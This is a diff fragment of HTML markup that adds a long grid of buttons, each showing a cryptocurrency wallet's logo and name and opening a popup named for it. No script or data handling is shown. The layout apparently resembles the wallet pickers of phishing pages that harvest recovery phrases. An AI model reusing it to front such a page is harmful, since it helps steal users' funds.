+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/bluewallet.jpg.jpeg" alt="Bluemoon.io Wallet"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Bluemoon.io Wallet</div>
+                      </div>
+                    </button>
+
+
+                    <button onclick="showPopup('Dorhimii Wallet')"
+                      style=" background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto; ">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/dok-a32c522e109217cc2a1a2a310f3c9bf7.png"
+                            alt="Dorhimii Wallet"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Dorhimii Wallet</div>
+                      </div>
+                    </button>
+
+                    <button onclick="showPopup('BitKeep Wallet')"
+                      style=" background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto; ">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/bitkeep-387b0ca7da4cf322f44c70c23064c529.png"
+                            alt="BitKeep Wallet"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">BitKeep Wallet</div>
+                      </div>
+                    </button>
+
+                    <button onclick="showPopup('Ambire Wallet')"
+                      style=" background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto; ">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/ambire.png" alt="Ambire Wallet"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Ambire Wallet</div>
+                      </div>
+                    </button>
+
+                    <button onclick="showPopup('Rainbow')"
+                      style=" background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto; ">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/rainbow-207dda8d66f8ffc00a21e4fcc5ce0a73.png"
+                            alt="Rainbow" style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Rainbow</div>
+                      </div>
+                    </button>
+
+                    <button onclick="showPopup('Gnoisis Safe Multisig')"
+                      style=" background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto; ">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/gnosis.png" alt="Gnoisis Safe Multisig"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Gnoisis Safe Multisig</div>
+                      </div>
+                    </button>
+
+                    <button onclick="showPopup('Argent')"
+                      style=" background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto; ">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/argent.png" alt="Argent"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Argent</div>
+                      </div>
+                    </button>
+
+                    <button onclick="showPopup('Pillar')"
+                      style=" background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto; ">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/pillar.png" alt="Pillar"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Pillar</div>
+                      </div>
+                    </button>
+
+                    <button onclick="showPopup('Anchor')"
+                      style=" background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto; ">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/anchor.png" alt="Anchor"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Anchor</div>
+                      </div>
+                    </button>
+
+                    <button onclick="showPopup('ONTO')"
+                      style=" background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto; ">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/onto-983003d35fe32bf916f9eda381f138f7.png" alt="ONTO"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">ONTO</div>
+                      </div>
+                    </button>
+
+                    <button onclick="showPopup('BitPay')"
+                      style=" background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto; ">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/bitpay-1573dd6c95eb38386f181048663590d0.jpg.jpeg"
+                            alt="BitPay" style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">BitPay</div>
+                      </div>
+                    </button>
+
+                    <button onclick="showPopup('Maiar')"
+                      style=" background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto; ">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/maiar.png" alt="Maiar"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Maiar</div>
+                      </div>
+                    </button>
+
+                    <button onclick="showPopup('Ledger Live')"
+                      style=" background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto; ">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/ledger_live.png" alt="Ledger Live"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Ledger Live</div>
+                      </div>
+                    </button>
+
+                    <button onclick="showPopup('Walleth')"
+                      style=" background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto; ">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/walleth-b60336f8dd9ea86285408cb4f96634d1.png"
+                            alt="Walleth" style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Walleth</div>
+                      </div>
+                    </button>
+
+                    <button onclick="showPopup('XDEFI Wallet')"
+                      style=" background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto; ">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/Xd.jpg.jpeg" alt="XDEFI Wallet"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">XDEFI Wallet</div>
+                      </div>
+                    </button>
+
+                    <button onclick="showPopup('Lead Wallet')"
+                      style=" background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto; ">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/lead.jpg.jpeg" alt="Digitex"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Lead Wallet</div>
+                      </div>
+                    </button>
+
+
+                    <button onclick="showPopup('StepN Wallet')"
+                      style=" background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto; ">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/step.jpg.jpeg" alt="Digitex"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">StepN Wallet</div>
+                      </div>
+                    </button>
+
+
+                    <button onclick="showPopup('THOR Wallet')"
+                      style=" background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto; ">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/Thor.jpg.jpeg" alt="Digitex"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">THOR Wallet</div>
+                      </div>
+                    </button>
+
+
+                    <button onclick="showPopup('Huobi Wallet')"
+                      style=" background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto; ">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/huobi.png" alt="Digitex"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Huobi Wallet</div>
+                    </button>
+
+                    <button onclick="showPopup('Eidoo')"
+                      style=" background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto; ">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/eidoo.png" alt="Digitex"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Eidoo</div>
+                    </button>
+
+
+                    <button onclick="showPopup('TrustVault')"
+                      style=" background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto; ">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/trustvault-9031a67f82293fc50ead978f936cfff3.png"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">TrustVault</div>
+                    </button>
+
+
+                    <button onclick="showPopup('CoolWallet')"
+                      style="background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto;">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/coolwallet.png" alt="CoolWallet"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">CoolWallet</div>
+                      </div>
+                    </button>
+
+                    <button onclick="showPopup('Alice')"
+                      style="background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto;">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/alice.png" alt="Alice"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Alice</div>
+                      </div>
+                    </button>
+
+                    <button onclick="showPopup('AlphaWallet')"
+                      style="background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto;">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/alpha.png" alt="AlphaWallet"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">AlphaWallet</div>
+                      </div>
+
+
+                    </button>
+                    <button onclick="showPopup('D\'CENT Wallet')"
+                      style="background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto;">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/dcent.png" alt="D'CENT Wallet"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">D'CENT Wallet</div>
+                      </div>
+                    </button>
+
+                    <button onclick="showPopup('Zelcore')"
+                      style="background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto;">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/zelcore-d4c1a7a444b95612f6373f0b536b6ccb.png"
+                            alt="Zelcore" style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Zelcore</div>
+                      </div>
+                    </button>
+
+                    <button onclick="showPopup('GridPlus')"
+                      style="background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto;">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/gridplus-8cedce167d37ddaa02f2afdf55841d8c.png"
+                            alt="GridPlus" style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">GridPlus</div>
+                      </div>
+                    </button>
+
+                    <button onclick="showPopup('CYBAVO Wallet')"
+                      style="background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto;">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/cybavowallet-16e7e96f2e3df01fe2170da5267774b5.png"
+                            alt="CYBAVO Wallet" style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">CYBAVO Wallet</div>
+                      </div>
+                    </button>
+
+                    <button onclick="showPopup('Tokenry')"
+                      style="background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto;">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/tokenry.png" alt="Tokenry"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Tokenry</div>
+                      </div>
+                    </button>
+                    <button onclick="showPopup('Wazirx')"
+                      style="background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto;">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/wazirx-logo-rounded.9bff9f42.png" alt="Wazirx"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Wazirx</div>
+                      </div>
+                    </button>
+
+                    <button onclick="showPopup('Torus')"
+                      style="background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto;">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/tolus.png" alt="Torus"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Torus</div>
+                      </div>
+                    </button>
+
+                    <button onclick="showPopup('Spatium')"
+                      style="background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto;">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/spatium.png" alt="Spatium"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Spatium</div>
+                      </div>
+                    </button>
+
+                    <button onclick="showPopup('SafePal')"
+                      style="background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto;">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/safepal.png" alt="SafePal"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">SafePal</div>
+                      </div>
+                    </button>
+
+                    <button onclick="showPopup('Equal')"
+                      style="background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto;">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/equal.png" alt="Equal"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Equal</div>
+                      </div>
+                    </button>
+
+                    <button onclick="showPopup('Infinito')"
+                      style="background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto;">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/infinito-wallet-68da061495160c96f4bcb5e70e612fdd.png"
+                            alt="Infinito" style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Infinito</div>
+                      </div>
+                    </button>
+
+                    <button onclick="showPopup('Wallet.io')"
+                      style="background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto;">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/wallet.io-198f396de22fe25eb370f46544abe69d.png"
+                            alt="Wallet.io" style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Wallet.io</div>
+                      </div>
+                    </button>
+
+                    <button onclick="showPopup('Infinity Wallet')"
+                      style="background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto;">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/infinit.png" alt="Infinity Wallet"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Infinity Wallet</div>
+                      </div>
+                    </button>
+
+                    <button onclick="showPopup('Ownbit')"
+                      style="background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto;">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/ownbit-0b6b21e40acf2fa0f85d2c5ce38c4c51.png" alt="Ownbit"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Ownbit</div>
+                      </div>
+                    </button>
+
+                    <button onclick="showPopup('EasyPocket')"
+                      style="background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto;">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/easy.png" alt="EasyPocket"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">EasyPocket</div>
+                      </div>
+                    </button>
+
+                    <button onclick="showPopup('Bridge Wallet')"
+                      style="background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto;">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/bridge.png" alt="Bridge Wallet"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Bridge Wallet</div>
+                      </div>
+                    </button>
+
